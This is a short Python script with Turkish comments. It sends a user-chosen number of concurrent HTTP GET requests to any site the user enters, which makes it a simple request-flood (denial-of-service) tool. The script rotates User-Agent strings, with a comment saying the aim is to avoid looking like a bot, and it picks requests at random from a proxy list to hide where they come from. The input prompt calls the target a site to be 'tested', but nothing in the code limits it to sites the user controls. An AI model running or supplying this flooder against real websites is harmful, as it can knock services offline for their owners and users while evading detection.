import aiohttp
import asyncio
import random

# Kullanıcıdan giriş al
site = input("Test edilecek site URL'sini girin (http/https ile): ")
num_requests = int(input("Kaç istek göndermek istiyorsun?: "))

# Farklı User-Agent'lar (Bot gibi görünmemek için)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36"
]

# Proxy Listesi (İsteğe bağlı, kendi proxy'lerini ekleyebilirsin)
proxy_list = [
    "http://123.456.78.9:8080",
    "http://98.76.54.32:3128",
    None  # Eğer proxy istemezsen None olacak
]

# Asenkron İstek Fonksiyonu
async def send_request(session):
    headers = {"User-Agent": random.choice(user_agents)}
    proxy = random.choice(proxy_list)  # Rastgele proxy seç
    try:
        async with session.get(site, headers=headers, proxy=proxy) as response:
            print(f"İstek gönderildi -> {response.status} {proxy if proxy else 'Proxy Yok'}")
    except Exception as e:
        print(f"Hata: {e}")

# Ana Asenkron Çalıştırıcı
async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(num_requests)]
        await asyncio.gather(*tasks)

# Çalıştır
asyncio.run(main())
